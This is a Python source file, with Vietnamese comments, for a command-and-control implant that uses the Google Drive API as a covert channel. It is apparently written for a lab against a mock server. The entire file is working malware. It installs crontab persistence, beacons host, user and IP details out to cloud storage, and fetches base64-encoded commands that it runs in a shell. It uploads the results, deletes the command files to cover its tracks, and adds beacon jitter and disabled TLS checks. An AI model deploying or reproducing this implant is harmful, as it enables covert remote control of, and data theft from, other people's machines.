#!/usr/bin/env python3
# =============================================================
# Cloud Storage C2 — Implant FIXED v2
# Fix 1: IP detection dùng socket connect trick thay gethostbyname
# Fix 2: find_file() bỏ parents filter cho khớp mock server
# Fix 3: upload dùng filename làm fileId thống nhất
# =============================================================
import os, sys, json, base64, time, uuid, subprocess
import platform, socket, hashlib, ssl, random, urllib.request, urllib.parse
from datetime import datetime

C2_HOST    = "www.googleapis.com"
FOLDER_ID  = "c2_lab_folder"
BEACON_INT = 60
JITTER_PCT = 0.20
UA         = "python-googleapiclient/1.0"

VICTIM_ID = hashlib.md5(
    (socket.gethostname() + os.environ.get('USER', 'u')).encode()
).hexdigest()[:8]

DEBUG = os.environ.get('C2_DEBUG', '0') == '1'
def log(msg):
    if DEBUG:
        print(f"[{datetime.now():%H:%M:%S}][{VICTIM_ID}] {msg}", flush=True)

# ── FIX 1: Lấy IP thật của interface ra ngoài ────────────────
def get_real_ip() -> str:
    """
    Dùng UDP connect trick — không thật sự gửi packet,
    chỉ để kernel chọn source IP đúng cho route đến 8.8.8.8
    Trả về IP của interface có default route, không bao giờ 127.x.x.x
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        # Fallback: duyệt interfaces tìm IP không phải loopback
        try:
            import subprocess
            out = subprocess.check_output(
                ["ip", "-4", "addr", "show", "scope", "global"],
                stderr=subprocess.DEVNULL
            ).decode()
            import re
            ips = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)/', out)
            # Bỏ loopback và link-local
            for ip in ips:
                if not ip.startswith('127.') and not ip.startswith('169.254.'):
                    return ip
        except:
            pass
        return socket.gethostbyname(socket.gethostname())

# ── HTTP helper ──────────────────────────────────────────────
class C2Http:
    def __init__(self):
        self.base      = f"https://{C2_HOST}"
        self.token     = None
        self.token_exp = 0
        self.ssl_ctx   = ssl.create_default_context()
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode    = ssl.CERT_NONE

    def _get_token(self):
        if self.token and time.time() < self.token_exp:
            return self.token
        try:
            body = b"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=mock"
            req  = urllib.request.Request(
                f"{self.base}/o/oauth2/token",
                data=body,
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": UA},
                method="POST")
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=10) as r:
                data           = json.loads(r.read())
                self.token     = data.get("access_token", "mock")
                self.token_exp = time.time() + 3500
                log(f"Token OK: {self.token[:20]}...")
        except Exception as e:
            log(f"Token error: {e}")
            self.token     = "mock_token"
            self.token_exp = time.time() + 300
        return self.token

    def _auth_headers(self):
        return {"Authorization": f"Bearer {self._get_token()}",
                "User-Agent": UA}

    def get_json(self, path, params=None) -> dict:
        url = f"{self.base}{path}"
        if params:
            url += "?" + urllib.parse.urlencode(params)
        try:
            req = urllib.request.Request(url, headers=self._auth_headers())
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=15) as r:
                return json.loads(r.read())
        except Exception as e:
            log(f"GET {path} error: {e}")
            return {}

    def get_bytes(self, path) -> bytes | None:
        url = f"{self.base}{path}"
        try:
            req = urllib.request.Request(url, headers=self._auth_headers())
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=15) as r:
                return r.read()
        except Exception as e:
            log(f"GET_BYTES {path} error: {e}")
            return None

    def upload(self, filename: str, content: bytes) -> bool:
        """
        FIX 2: Upload với ?name=filename&fileId=filename
        Mock server dùng fileId làm key lưu file → đảm bảo find_file tìm được
        """
        params = urllib.parse.urlencode({"name": filename,
                                         "fileId": filename,
                                         "uploadType": "media"})
        url = f"{self.base}/upload/drive/v3/files?{params}"
        try:
            req = urllib.request.Request(
                url, data=content,
                headers={**self._auth_headers(),
                         "Content-Type": "application/json"},
                method="POST")
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=15) as r:
                resp = json.loads(r.read())
                log(f"Upload OK: {filename} id={resp.get('id')}")
                return True
        except Exception as e:
            log(f"Upload {filename} error: {e}")
            return False

    def delete(self, file_id: str):
        url = f"{self.base}/drive/v3/files/{urllib.parse.quote(file_id)}"
        try:
            req = urllib.request.Request(
                url, headers=self._auth_headers(), method="DELETE")
            urllib.request.urlopen(req, context=self.ssl_ctx, timeout=10)
            log(f"Deleted: {file_id}")
        except Exception as e:
            log(f"Delete {file_id} error: {e}")

# ── Drive helpers ────────────────────────────────────────────
http = C2Http()

def find_file(name: str) -> str | None:
    """
    FIX 2: Bỏ parents filter — mock server không hỗ trợ
    Chỉ query theo name, đủ cho lab environment
    """
    data  = http.get_json("/drive/v3/files",
                          {"q": f"name='{name}'",
                           "fields": "files(id,name)"})
    files = data.get("files", [])
    fid   = files[0]["id"] if files else None
    log(f"find_file({name}) → {fid}")
    return fid

def upload_json(name: str, content: dict) -> bool:
    return http.upload(name, json.dumps(content).encode())

def download_json(name: str) -> dict | None:
    # Thử download trực tiếp theo filename (mock server support)
    raw = http.get_bytes(f"/drive/v3/files/{urllib.parse.quote(name)}?alt=media")
    if raw:
        try:
            data = json.loads(raw)
            log(f"download_json({name}) → OK ({len(raw)}B)")
            return data
        except Exception as e:
            log(f"download_json parse error: {e}")

    # Fallback: tìm file_id rồi download
    fid = find_file(name)
    if not fid:
        log(f"download_json({name}) → not found")
        return None
    raw = http.get_bytes(f"/drive/v3/files/{urllib.parse.quote(fid)}?alt=media")
    if raw:
        try:
            return json.loads(raw)
        except:
            return None
    return None

# ── T1053.003: Persistence ───────────────────────────────────
def install_persistence():
    implant = os.path.abspath(sys.argv[0])
    entry   = f"@reboot {implant} >/dev/null 2>&1 &\n"
    try:
        existing = subprocess.check_output(
            ["crontab", "-l"], stderr=subprocess.DEVNULL)
        if implant.encode() in existing:
            log("Persistence already installed")
            return
        new_cron = existing + entry.encode()
    except subprocess.CalledProcessError:
        new_cron = entry.encode()
    try:
        proc = subprocess.Popen(["crontab", "-"],
                                 stdin=subprocess.PIPE,
                                 stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
        proc.communicate(new_cron)
        log("Persistence: crontab installed")
    except Exception as e:
        log(f"Persistence error: {e}")

# ── T1102.002: Beacon ────────────────────────────────────────
def send_beacon():
    real_ip = get_real_ip()   # FIX 1
    info = {
        "id":       VICTIM_ID,
        "hostname": socket.gethostname(),
        "user":     os.environ.get("USER", "unknown"),
        "os":       platform.platform()[:60],
        "ip":       real_ip,
        "ts":       int(time.time()),
    }
    ok = upload_json(f"beacon_{VICTIM_ID}.txt", info)
    log(f"Beacon sent: ip={real_ip} ok={ok}")

# ── T1059.004: Poll + execute ────────────────────────────────
def check_and_execute():
    cmd_filename = f"cmd_{VICTIM_ID}.json"
    data = download_json(cmd_filename)

    if not data:
        log("No pending command")
        return

    try:
        cmd = base64.b64decode(data["cmd"]).decode()
        log(f"Executing: {cmd!r}")

        out = subprocess.check_output(
            cmd, shell=True,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        result = {
            "id":     VICTIM_ID,
            "cmd":    data["cmd"],
            "output": base64.b64encode(out).decode(),
            "ts":     int(time.time()),
            "rc":     0,
        }
        ok = upload_json(f"result_{VICTIM_ID}.json", result)
        log(f"Result uploaded: {len(out)}B ok={ok}")

        # Xoá cmd file (opsec)
        http.delete(cmd_filename)

    except subprocess.TimeoutExpired:
        log("Command timeout (30s)")
    except subprocess.CalledProcessError as e:
        # Vẫn upload error output
        result = {
            "id":     VICTIM_ID,
            "cmd":    data.get("cmd", ""),
            "output": base64.b64encode(e.output or b"(error)").decode(),
            "ts":     int(time.time()),
            "rc":     e.returncode,
        }
        upload_json(f"result_{VICTIM_ID}.json", result)
        log(f"Command failed rc={e.returncode}")
    except Exception as e:
        log(f"Exec error: {e}")

# ── Main ─────────────────────────────────────────────────────
def main():
    log(f"Implant started VID={VICTIM_ID} ip={get_real_ip()}")
    install_persistence()

    while True:
        try:
            send_beacon()
            check_and_execute()
        except Exception as e:
            log(f"Loop error: {e}")

        j     = BEACON_INT * JITTER_PCT
        sleep = BEACON_INT + random.uniform(-j, j)
        log(f"Sleep {sleep:.1f}s")
        time.sleep(max(sleep, 20))

if __name__ == "__main__":
    main()
                                
